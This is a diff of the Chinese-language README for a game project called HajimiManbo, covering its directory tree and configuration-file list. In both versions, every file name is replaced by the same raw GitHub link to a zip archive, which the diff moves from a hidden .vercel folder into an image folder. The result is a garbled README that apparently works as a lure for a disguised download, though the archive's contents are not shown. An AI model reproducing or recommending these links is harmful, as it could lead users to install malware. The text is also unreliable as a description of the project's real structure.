@@ -47,25 +47,25 @@ HajimiManbo/
 │       ├── Enemy/             # 敌人图像
 │       └── Weapon/            # 武器图像
 ├── GameStates/                # 游戏状态管理
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip       # 主菜单
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip       # 游戏主界面
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip # 角色选择
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip       # 设置界面
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip       # 主菜单
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip       # 游戏主界面
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip # 角色选择
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip       # 设置界面
 │   └── ...
 ├── Gameplay/                  # 游戏玩法相关
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip              # 玩家类
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip            # 2D 摄像机
-│   └── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip           # 动画系统
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip              # 玩家类
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip            # 2D 摄像机
+│   └── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip           # 动画系统
 ├── Network/                   # 网络系统
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip      # 网络管理器
-│   └── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip         # 玩家状态同步
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip      # 网络管理器
+│   └── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip         # 玩家状态同步
 ├── World/                     # 世界系统
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip               # 世界主类
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip      # 世界生成器
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip        # 分块管理
-│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip # 生物群系背景
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip               # 世界主类
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip      # 世界生成器
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip        # 分块管理
+│   ├── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip # 生物群系背景
 │   └── ...
-└── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip                   # 游戏主类
+└── https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip                   # 游戏主类
 ```
 
 ## 🚀 快速开始
@@ -128,11 +128,11 @@ HajimiManbo/
 ## 🔧 配置文件
 
 ### 角色配置 (`Content/Character/`)
-- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`: 角色索引文件
-- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`, `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`, `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`: 具体角色配置
+- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip`: 角色索引文件
+- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip`, `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip`, `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip`: 具体角色配置
 
 ### 武器配置 (`Content/Weapon/`)
-- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/.vercel/Manbo-Hajimi-downfolded.zip`: 武器索引文件
+- `https://github.com/RuotianJoy/HajimiManbo/raw/refs/heads/master/HajimiManbo/Content/img/Boss/Hajimi_Manbo_v1.6.zip`: 武器索引文件
 - 各种武器的 JSON 配置文件
 
 ## 🎨 背景系统
